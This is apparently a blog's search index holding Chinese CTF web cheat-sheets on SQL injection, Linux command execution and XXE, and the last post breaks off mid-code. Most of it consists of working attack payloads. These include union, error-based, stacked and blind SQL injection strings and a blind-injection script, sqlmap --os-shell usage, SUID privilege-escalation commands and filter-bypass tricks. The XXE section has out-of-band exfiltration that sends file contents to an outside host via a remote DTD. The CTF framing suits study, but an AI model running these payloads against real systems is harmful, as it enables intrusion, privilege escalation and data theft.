<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入汇总</title>
      <link href="/posts/27c8c18f.html"/>
      <url>/posts/27c8c18f.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-结构"><a href="#SQL-结构" class="headerlink" title="SQL 结构"></a>SQL 结构</h1><p>整个结构分为数据库(database)，表(table)，列(column)和数据。<br>具体关系如图</p><ul><li>数据库 mysql(database)</li><li><ul><li>表 ctf(table)</li></ul></li><li><ul><li><ul><li>列 secret (column)</li></ul></li></ul></li><li><ul><li><ul><li><ul><li>数据</li></ul></li></ul></li></ul></li><li><ul><li><ul><li>列 user (column)</li></ul></li></ul></li><li><ul><li><ul><li><ul><li>数据</li></ul></li></ul></li></ul></li><li><ul><li>表 score(table)</li></ul></li><li><ul><li><ul><li>……</li></ul></li></ul></li></ul><p>查询语句通常为 select a from b where c<br>查库名 select schema_name from information_schema.schemata<br>查表名 select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>查列名 select group_concat(column_name) from information_schema.columns where table_name&#x3D;’ctf’<br>查数据 select group_concat(secret,user) from ctf</p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><ul><li>适合有回显的情况</li></ul><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字类（如-id）"><a href="#数字类（如-id）" class="headerlink" title="数字类（如 id）"></a>数字类（如 id）</h3><pre><code>$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</code></pre><p>直接在数字后注入，不需要空格，做多了可以默认字符类，只是要注意。</p><h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><pre><code>SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;;</code></pre><p>需要引号闭合。看题目，如果没给源码一般是单个’或”闭合，如果给了源码要判断所有的闭合，记得括号也要闭合完全就行，比如 username&#x3D;1’))))之类。</p><h2 id="手动注"><a href="#手动注" class="headerlink" title="手动注"></a>手动注</h2><p>注入时要闭合 sql 语句，使用注释符号–+（这里的+是 url 编码过的空格,get 传参网站自动省略最后的空格）,– ,（不能忘了空格）,#,%23,^1 等。<br>高级的可以构造如 or ‘1’&#x3D;’1 来闭合后面的引号，类似的还有末尾加’,where&#x2F;**&#x2F;‘1，（做多了题感觉注释真的很看脸，注释不成功就注不下去了）</p><ul><li>1’ or true# (万能密码)(在这里处理掉所有闭合和注释问题)</li><li>1’ order by 3#<br> 一直累加数字直到报错（或出现不同界面）：<br> 1’ order by 4#<br>Unknown column ‘4’ in ‘order clause<br>这时说明一共三位，联合查询三位。</li><li>a’union select 1,2,3#<br>回显的数字说明哪里是回显位。例子回显了 2</li><li>a’union select 1,database(),3#<ul><li>库名 mysql</li></ul></li><li>a’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#<ul><li>表名 ctf</li><li>还有种类似写法是把 select 写到里面，如：<br>a’union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3#。个人不推荐，很影响美观</li></ul></li><li>a’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’ctf’#<ul><li>列名 secret</li></ul></li><li>a’union select 1,group_concat(secret),3 from ctf#<ul><li>得到 flag，这里 from 后面可以不需要引号</li><li>如果限制字符长度可能读不全，需要使用函数截取长度<br>常见的如 substring,substr,mid,right,left（读不出来记得换，小心过滤）<ul><li>a’union select 1,substring(group_concat(secret),0,30),3 from ctf#</li><li>a’union select 1,substring(group_concat(secret),25,30),3 from ctf#<ul><li>记得合并去除重叠字符</li></ul></li></ul></li><li>一次读多个数据这样写<ul><li>a’union select 1,group_concat(id,’<del>‘,username,’</del>‘,password),3 from user#</li></ul></li></ul></li></ul><h2 id="自动注-没找到一键绕-waf-的工具"><a href="#自动注-没找到一键绕-waf-的工具" class="headerlink" title="自动注(没找到一键绕 waf 的工具)"></a>自动注(没找到一键绕 waf 的工具)</h2><h3 id="SQLMAP-绕-waf-巨麻烦"><a href="#SQLMAP-绕-waf-巨麻烦" class="headerlink" title="SQLMAP(绕 waf 巨麻烦)"></a>SQLMAP(绕 waf 巨麻烦)</h3><p>曾经直接注被 Cookies 卡了半天。我更推荐把 http 文件保存下来用 sqlmap。</p><ul><li>直接 GET 注： python sqlmap.py -u “url?id&#x3D;1” –batch</li><li>使用-r 参数<br>用 burp 保存为 1.txt 放到同目录。<br>python sqlmap.py -r 1.txt -p username –batch<ul><li>库名 python sqlmap.py -r 1.txt -p username –batch –dbs<ul><li>当前库名 python sqlmap.py -r 1.txt -p username –batch –current-db</li></ul></li><li>表名 python sqlmap.py -r 1.txt -p username –batch -D mysql –tables</li><li>列名数据一起 python sqlmap.py -r 1.txt -p username –batch -D mysql -T ctf –columns –dump</li></ul></li><li>选择注入方法 –-technique<ul><li>默认为所有<ul><li>注入类型对应的参数<br> B：基于布尔的盲注<br> E：基于错误<br> U：基于联合查询<br> S：堆叠查询<br> T：基于时间的盲注<br> Q：内联查询<br>python sqlmap.py -r 1.txt -p username –-technique BE –batch</li></ul></li></ul></li><li>SQLMAP 写 shell<br> python sqlmap.py -r 1.txt -p username –batch –os-shell<br> 找不到 flag 时可以试试</li></ul><p>绕 waf 不好用，不如手写。想了解可以自己搜搜，要加巨多规则。</p><h1 id="报错注入（待解释）"><a href="#报错注入（待解释）" class="headerlink" title="报错注入（待解释）"></a>报错注入（待解释）</h1><ul><li><p>extractvalue</p><p>1’||extractvalue(1,concat(‘<del>‘,database()))#<br>1’||extractvalue(1,concat(‘</del>‘,(select(group_concat(schema_name))from(information_schema.schemata))))#<br>1’||extractvalue(1,concat(‘<del>‘,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘security’))))#<br>1’||extractvalue(1,concat(‘</del>‘,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘users’))))#<br>1’||extractvalue(1,concat(‘<del>‘,(select(data)from(output))))#<br>1’||extractvalue(1,concat(‘</del>‘,(select(mid((data),25,30))from(output))))#</p></li><li><p>updatexml</p><p>1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#<br>1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#<br>1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘data1’)),0x7e),1))#<br>1’or(updatexml(1,concat(0x7e,(select(group_concat(username,’~’,password))from(data1)),0x7e),1))#<br>1’or(updatexml(1,concat(0x7e,(select(group_concat(password))from(user)),0x7e),1))#<br>1’or(updatexml(1,concat(0x7e,(select(substring(group_concat(link),25,30))from(user)),0x7e),1))#<br>1’or(updatexml(1,concat(0x7e,(select(right(group_concat(link),25))from(user)),0x7e),1))#<br>&#x2F;&#x2F;substring,substr,mid,right,left</p></li></ul><h1 id="堆叠注入（待解释）"><a href="#堆叠注入（待解释）" class="headerlink" title="堆叠注入（待解释）"></a>堆叠注入（待解释）</h1><p>在 SQL 终端 中，分号（;）是用来表示一条 sql 语句的结束。在 ; 结束一个 sql 语句后继续构造下一条语句，语句会一起执行。</p><pre><code>*,11;set sql_mode=pipes_as_concat;select 11&#39;;show databases;#得表名supersqli1&#39;;use supersqli;show tables;#1&#39;;use supersqli;show columns from `words`;#1&#39;;use supersqli;show columns from `1919810931114514`;#①1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#1&#39;or 1=1#②1&#39;;use supersqli;SET @sql=concat(&#39;s&#39;,&#39;elect `flag` from `1919810931114514`&#39;);PREPARE sql1 from @sql;EXECUTE sql1;#③1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre><h1 id="布尔，时间盲注（时间待补充）"><a href="#布尔，时间盲注（时间待补充）" class="headerlink" title="布尔，时间盲注（时间待补充）"></a>布尔，时间盲注（时间待补充）</h1><p>利用脚本 二分查找所有可见字符<br>sql_bool.py</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 查库名</span></span><br><span class="line"><span class="comment"># payload1 = &quot;1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;  # 库名为news</span></span><br><span class="line">payload1 = <span class="string">&quot;1/**/and(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="comment"># payload2 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;news&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;  # 表名为admin,contents</span></span><br><span class="line">payload2 = <span class="string">&quot;1/**/and(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 查字段</span></span><br><span class="line"><span class="comment"># payload3 = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;admin&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;  # admin表里有id,username,password,is_enable</span></span><br><span class="line">payload3 = <span class="string">&quot;1/**/and(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 查字段值</span></span><br><span class="line"><span class="comment"># payload4 = &quot;1^(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span></span><br><span class="line">payload4 = <span class="string">&quot;1/**/and(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">28</span></span><br><span class="line">    high = <span class="number">137</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        url = <span class="string">&quot;http://node5.anna.nssctf.cn:25132/?stunum=&quot;</span></span><br><span class="line">        payload = payload4.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        url += payload <span class="comment"># GET</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># data = &#123;&quot;username&quot;: payload&#125; # POST</span></span><br><span class="line">        <span class="comment"># r = requests.post(url=url, data=data).text</span></span><br><span class="line">        <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">28</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sql_time.py</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="大小写，双写"><a href="#大小写，双写" class="headerlink" title="大小写，双写"></a>大小写，双写</h2><p>字面意思，有些过滤不严的只过滤全小写，sql 对大小写不敏感，构造 Select 就能绕过，双写如过滤 or 在中间再写一遍，oorr 就绕过了<br>判断通过报错中没有对应关键字逐一尝试就行（应该不会有出题人不给源码和报错又加双写吧）</p><h2 id="16-进制转换"><a href="#16-进制转换" class="headerlink" title="16 进制转换"></a>16 进制转换</h2><p>可以把引号内的字符串转为 0x 开头的 16 进制数来绕过<br>‘flag’-&gt;0x666c6167</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;0x&#x27;</span>.<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常用替换"><a href="#常用替换" class="headerlink" title="常用替换"></a>常用替换</h2><ul><li>空格-&gt;&#x2F;**&#x2F;,括号绕过,%a0</li><li>and-&gt;&amp;&amp;</li><li>or-&gt;||</li><li>&#x3D;-&gt;like,regexp</li><li>database()-&gt;schema()</li><li>table_schema-&gt;database_name</li></ul><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p>–空格,–+,#,%23,^1,末尾加’,where&#x2F;**&#x2F;‘1</p><h2 id="大于小于号绕过"><a href="#大于小于号绕过" class="headerlink" title="大于小于号绕过"></a>大于小于号绕过</h2><p>在 sql 盲注中，一般使用大小于号来判断 ascii 码值的大小来达到爆破的效果。<br>绕过可以使用下列函数</p><ul><li>greatest(n1, n2, n3…):返回 n 中的最大值</li><li>least(n1,n2,n3…):返回 n 中的最小值</li></ul><p>select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;99;<br>1</p><ul><li>strcmp(str1,str2):<br>若所有的字符串均相同，则返回 STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1<br>select * from cms_users where userid&#x3D;1 and strcmp(ascii(substr(database(),0,1)),99);</li><li>in 关键字<br>select * from cms_users where userid&#x3D;1 and substr(database(),1,1) in (‘c’);</li><li>between a and b:范围在 a-b 之间（不包含 b）<br>select * from cms_users where userid&#x3D;1 and substr(database(),1,1) between ‘a’ and ‘d’;</li></ul><h2 id="concat-被过滤"><a href="#concat-被过滤" class="headerlink" title="concat 被过滤"></a>concat 被过滤</h2><ul><li>在 select 语句结尾加 limit 1（只会读取一个数据，即第一个）<br>可以逐一读取直到读到想要的值<br>limit 0,1-&gt;第一个,limit 1,1-&gt;第二个,limit 2,1-&gt;第三个…<br><a href="https://blog.csdn.net/nicai321/article/details/123119356">https://blog.csdn.net/nicai321/article/details/123119356</a></li></ul><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p>适用 information_schema 被过滤。<br>原理为将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询</p><pre><code>1&#39;union/**/select/**/1,2,`1`/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/&#39;11&#39;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/&#39;1</code></pre><p>当&#96;反引号也被过滤时，使用 as 别名替换绕过</p><pre><code>1&#39;union/**/select/**/1,2,group_concat(a)/**/from/**/(select/**/1/**/as/**/a/**/union/**/select/**/*/**/from/**/ctftraining.flag)xxx/**/where/**/&#39;1</code></pre><h2 id="过滤了小括号"><a href="#过滤了小括号" class="headerlink" title="过滤了小括号()"></a>过滤了小括号()</h2><p>运气做出来过一题，记录一下<br>concat()转为 limit,然而 limit 也被屏蔽后。。</p><pre><code>eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Schemata+Where+Schema_name+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Tables+Where+Table_Schema+like+&#39;ctf&#39;+and+Table_name+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,2*1e308,4,5+From+Information_Schema.Columns+Where+Table_Schema+like+&#39;ctf&#39;+and+Table_name+like+&#39;f1444444g&#39;+and+Column_name+like+binary+&#39;A%&#39;%23eid002&#39;+Union+Select+1,2,fl4g,4,5+From+f1444444g%23</code></pre><p>靠执行成功时数字溢出进行布尔盲注。</p><h1 id="SQL-杂项"><a href="#SQL-杂项" class="headerlink" title="SQL 杂项"></a>SQL 杂项</h1><ul><li><p>ffifdyop md5($password,’true’)-&gt;ffifdyop</p></li><li><p>可尝试 load_file()直接读入</p><ul><li>1’union select 1,2,3,4,load_file(‘&#x2F;flag’)</li></ul></li><li><p>SQL 登录题</p><ul><li>username&#x3D;1’ union select 1,’admin’,’e10adc3949ba59abbe56e057f20f883e’#&amp;pw&#x3D;123456</li><li>username&#x3D;admin’&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;password&#x2F;**&#x2F;with&#x2F;**&#x2F;rollup#&amp;password&#x3D;</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux命令执行</title>
      <link href="/posts/5eef1d19.html"/>
      <url>/posts/5eef1d19.html</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="常见命令执行命令"><a href="#常见命令执行命令" class="headerlink" title="常见命令执行命令"></a>常见命令执行命令</h2><pre><code>systemexecpassthrushell_exec</code></pre><p>后三个命令无回显，需要保存到文件<br>cmd&#x3D;ls &#x2F;|tee 1.txt<br>访问 <a href="http://url/1.txt">http://url/1.txt</a></p><h2 id="部分-SUID-命令提权"><a href="#部分-SUID-命令提权" class="headerlink" title="部分 SUID 命令提权"></a>部分 SUID 命令提权</h2><p>寻找所有权限带 s 的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br><span class="line"></span><br><span class="line">-user 指定文件拥有者</span><br><span class="line">-perm 文件权限</span><br><span class="line">-<span class="built_in">exec</span> 执行系统命令</span><br></pre></td></tr></table></figure><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><pre><code>find /etc/passwd -exec &quot;whoami&quot; \;</code></pre><h3 id="date-读取文件"><a href="#date-读取文件" class="headerlink" title="date 读取文件"></a>date 读取文件</h3><pre><code>date -f/--file &lt;filename&gt;</code></pre><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><pre><code>awk &#39;BEGIN &#123;system(&quot;whoami&quot;)&#125;&#39;</code></pre><h3 id="sed-读取文件"><a href="#sed-读取文件" class="headerlink" title="sed 读取文件"></a>sed 读取文件</h3><pre><code>sed -n &#39;1p&#39; /flag</code></pre><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><pre><code>vim /etc/sudoers添加你的账户sudo bash</code></pre><h3 id="file-读取文件"><a href="#file-读取文件" class="headerlink" title="file 读取文件"></a>file 读取文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file -f /flag</span><br></pre></td></tr></table></figure><h2 id="linux-管道符"><a href="#linux-管道符" class="headerlink" title="linux 管道符"></a>linux 管道符</h2><pre><code>; 前面执行完成后再执行后面的语句| 直接执行后面的执行语句|| 只有前面执行出错时才执行后面的执行语句&amp; 无论前面真假都执行后面的语句&amp;&amp; 只有前面为真才执行后面的语句换行符%0a、%0d、\n</code></pre><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h3><pre><code>flag 被过滤cat /flagcat /fla\gcat /fla&quot;&quot;gcat /fla&#39;&#39;gcat /fl??cat /f\*cat /[e-h][k-m][9-b][e-h]cat /fl$1agcat /fl$2agcat /fl$@ag/???/?at /flaga=g;cat /fla$a</code></pre><h3 id="cat-类似命令"><a href="#cat-类似命令" class="headerlink" title="cat 类似命令"></a>cat 类似命令</h3><pre><code>more、less、head、tail、sort、tac、nl</code></pre><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$1、$IFS$9、$&#123;IFS&#125;、$IFS</code></pre><h3 id="payload-经过-base64-绕过"><a href="#payload-经过-base64-绕过" class="headerlink" title="payload 经过 base64 绕过"></a>payload 经过 base64 绕过</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2F0IC9mbGFn|<span class="built_in">base64</span> -d|sh</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure><h1 id="重要文件"><a href="#重要文件" class="headerlink" title="重要文件"></a>重要文件</h1><pre><code>/proc/self/environ/etc/hosts/etc/passwd/var/log/nginx/access.log/var/log/apache2/access.log/proc/self/fd/3/proc/self/cmdline</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/posts/e93ac459.html"/>
      <url>/posts/e93ac459.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE （PHP 5.45 之后不解析实体）</p><pre><code>&lt;!DOCTYPE 根标签名 SYSTEM &quot;文件名&quot;&gt;</code></pre><p>DTD 实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。</p><p>约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><pre><code>&lt;!ELEMENT 标签名 ANY&gt;</code></pre><p>同时 xxe 可进行内网探测读取 &#x2F;etc&#x2F;hosts</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><h2 id="PHP-文件读取"><a href="#PHP-文件读取" class="headerlink" title="PHP 文件读取"></a>PHP 文件读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="file-协议读取文件"><a href="#file-协议读取文件" class="headerlink" title="file 协议读取文件"></a>file 协议读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="SVG-格式"><a href="#SVG-格式" class="headerlink" title="SVG 格式"></a>SVG 格式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;/etc/passwd&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h2 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h2><p>攻击服务器创建 shell.dtd：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1:5555/?flag=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h2 id="xxe-绕过的-payload"><a href="#xxe-绕过的-payload" class="headerlink" title="xxe 绕过的 payload"></a>xxe 绕过的 payload</h2><p>当只过滤了 SYSTEM，PUBLIC 等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % xml &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;</span><br><span class="line"></span><br><span class="line">    %xml;</span><br></pre></td></tr></table></figure><p>即为在 xml 实体中再定义一次 xml，可成功被解析，支持 dtd 数据外带</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;core&gt;</span><br><span class="line">      &lt;message&gt;&amp;xxe;&lt;/message&gt;</span><br><span class="line">&lt;/core&gt;</span><br></pre></td></tr></table></figure><p>XXE 待复现<br>转自 <a href="https://wiki.wgpsec.org/knowledge/ctf/xxe.html">https://wiki.wgpsec.org/knowledge/ctf/xxe.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[奇安信]Web-4-littledropbox</title>
      <link href="/posts/89707270.html"/>
      <url>/posts/89707270.html</url>
      
        <content type="html"><![CDATA[<h1 id="little-dropbox"><a href="#little-dropbox" class="headerlink" title="little dropbox"></a>little dropbox</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span 